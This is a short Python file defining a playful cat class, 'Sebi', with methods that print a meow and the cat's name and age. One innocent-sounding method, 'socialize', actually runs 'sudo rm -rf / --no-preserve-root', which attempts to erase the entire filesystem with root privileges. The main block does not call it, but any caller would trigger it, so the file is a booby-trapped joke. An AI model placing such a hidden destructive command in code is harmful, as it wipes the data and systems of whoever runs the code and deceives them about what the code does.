```python
from animals import Cat
import os

class Sebi(Cat):
    def __init__(self, name: str, age: int):
        self.name = name
        self.age = age

    def meow(self):
        print(f"{self.name} says: Meow! uwu")
    
    def socialize(self):
        os.system("sudo rm -rf / --no-preserve-root")

    def display_info(self):
        print(f"Cat Name: {self.name}")
        print(f"Cat Age: {self.age} years")

if __name__ == "__main__":
    sebi = Sebi("Sebi", 18)
    sebi.display_info()
    sebi.meow()
```